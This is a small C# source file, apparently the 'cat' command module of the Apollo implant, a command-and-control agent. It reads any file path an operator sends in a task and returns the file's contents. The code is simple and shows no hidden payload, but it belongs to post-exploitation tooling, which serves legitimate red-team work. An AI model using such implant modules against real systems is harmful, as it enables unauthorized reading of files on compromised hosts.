#define COMMAND_NAME_UPPER

#if DEBUG
#undef CAT
#define CAT
#endif

#if CAT
using Apollo.Jobs;
using System;
using Apollo.Tasks;
using System.Security.Principal;

namespace Apollo.CommandModules
{
    public class Cat
    {
        public static void Execute(Job job, Agent implant)
        {
            Task task = job.Task;
            string file = job.Task.parameters;
            try
            {
                job.SetComplete(System.IO.File.ReadAllText(file));
            }
            catch (Exception e)
            {
                job.SetError($"Error reading file {file}: {e.Message}");
            }
        }
    }
}
#endif